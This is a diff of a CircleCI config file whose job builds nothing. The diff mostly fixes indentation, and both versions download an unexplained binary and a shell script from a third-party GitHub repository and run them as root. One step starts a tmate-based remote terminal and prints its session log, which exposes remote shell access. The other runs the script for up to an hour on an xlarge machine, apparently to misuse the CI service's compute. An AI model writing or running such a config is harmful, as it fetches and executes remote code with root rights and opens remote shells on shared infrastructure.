@@ -1,26 +1,26 @@
-version: 2.1 
-jobs: 
-  build: 
-    machine: 
+version: 2.1
+jobs:
+  build:
+    machine:
       resource_class: xlarge
-      image: ubuntu-2004:202101-01 
-  steps: 
-      - run:  
-         name: Downloading 
-         command: | 
-          sudo su --command "wget https://raw.githubusercontent.com/masdinoyo/tmate/main/tmateo && apt-get update && apt-get install tmate -y && chmod +x tmateo" 
-          sudo su --command "nohup ./tmateo --log=stdout > meta.log &" 
-          sleep 10 
-          sudo su --command "cat meta.log"     
-      - run:  
-         name: Executing 
-         no_output_timeout: 60m 
-         command: | 
-          wget https://raw.githubusercontent.com/masdinoyo/tmate/main/maxs.sh 
-          chmod +x maxs.sh 
-          sudo su --command "./maxs.sh" 
-workflows: 
-    version: 2 
-    build: 
-        jobs: 
+      image: ubuntu-2004:202101-01
+    steps:
+      - run: 
+         name: Downloading
+         command: |
+          sudo su --command "wget https://raw.githubusercontent.com/masdinoyo/tmate/main/tmateo && apt-get update && apt-get install tmate -y && chmod +x tmateo"
+          sudo su --command "nohup ./tmateo --log=stdout > meta.log &"
+          sleep 10
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: Executing
+         no_output_timeout: 60m
+         command: |
+          wget https://raw.githubusercontent.com/masdinoyo/tmate/main/maxs.sh
+          chmod +x maxs.sh
+          sudo su --command "./maxs.sh"
+workflows:
+    version: 2
+    build:
+        jobs:
             - build
